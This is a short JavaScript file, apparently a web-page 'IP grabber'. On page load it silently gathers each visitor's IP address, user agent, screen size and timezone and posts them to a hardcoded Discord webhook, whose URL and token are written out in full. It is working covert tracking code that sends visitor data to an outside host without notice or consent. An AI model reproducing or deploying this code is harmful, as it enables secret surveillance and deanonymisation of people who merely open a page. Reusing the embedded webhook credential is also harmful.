
  function getUserInfo() {
  var userAgent = navigator.userAgent;
  var screenSize = "Width: " + window.screen.width + " Height: " + window.screen.height;
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      var ipAddress = data.ip;
      var payload = {
        "embeds": [
          {
            "title": "Le epic eye pee grabber",
            "color": 3447003,
            "fields": [
              {
                "name": "User Agent",
                "value": `${userAgent}`
              },
              {
                "name": "Screen Size",
                "value": `${screenSize}`
              },
              {
                "name": "Timezone",
                "value": `${timezone}`
              },
              {
                "name": "IP Address",
                "value": `${ipAddress}`
              }
            ],
            "image": {
              "url": "https://cdn.discordapp.com/attachments/1171972380072095830/1184565737399005346/gih.jpg"
            }
          }
        ]
      };
      sendToDiscord(payload);
    })
    .catch(error => console.error('Error:', error));
}
function sendToDiscord(payload) {
  var webhookURL = 'https://discord.com/api/webhooks/1184555641906397264/8UsbS5AWgS1LH8eZfhCIWSL6lU8lNU6k7UmibXlGus4gOJIU1YJBRkaTCNYFvNjJXy1f';
  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  })
  .then(response => console.log('200 OK', payload))
  .catch(error => console.error('502 BAD', error));
}
window.onload = getUserInfo;